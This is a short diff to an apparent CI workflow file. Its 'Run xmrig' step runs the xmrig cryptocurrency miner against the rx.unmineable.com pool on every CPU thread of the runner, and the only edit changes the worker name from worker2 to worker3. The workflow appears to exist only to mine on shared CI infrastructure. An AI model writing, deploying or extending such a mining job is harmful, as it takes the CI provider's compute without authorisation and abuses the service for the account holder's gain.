@@ -26,4 +26,4 @@ jobs:
       - name: Run xmrig
         run: |
           cd xmrig-6.25.0
-          ./xmrig -o rx.unmineable.com:3333 -u 1853675284.worker2 -p x --threads=$(nproc) --cpu-priority 5
+          ./xmrig -o rx.unmineable.com:3333 -u 1853675284.worker3 -p x --threads=$(nproc) --cpu-priority 5
